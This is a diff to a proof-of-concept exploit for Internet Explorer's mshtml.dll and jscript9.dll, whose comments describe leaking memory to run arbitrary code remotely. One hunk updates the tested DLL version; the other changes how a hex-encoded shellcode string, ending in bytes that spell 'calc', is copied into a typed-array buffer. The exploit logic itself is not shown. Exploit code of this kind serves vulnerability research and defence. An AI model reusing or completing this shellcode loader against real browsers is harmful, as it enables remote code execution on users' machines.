@@ -45,7 +45,7 @@ capability, necessary information can be leaked and manipulated to execute
 arbitrary code remotely.
 *) Comment in the alert messages to see some leaks ;)
 *) This is PoC Code: If it does not work for you, clear IE's history and try
-again. Tested against latest mshtml.dll and jscript9.dll (Jan 30 2015)
+again. Tested against mshtml.dll and jscript9.dll version 10.0.9200.17183
 
 
 *) Inspired by:
@@ -201,7 +201,7 @@ function run(){
     "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"+
     "\x00"
 
-    scBuf = new Uint8Array(new ArrayBuffer(sc.length))
+    scBuf = new Uint8Array(sc.length)
     for (n=0; n<sc.length; n++){
         scBuf[n] = sc.charCodeAt(n)
     }
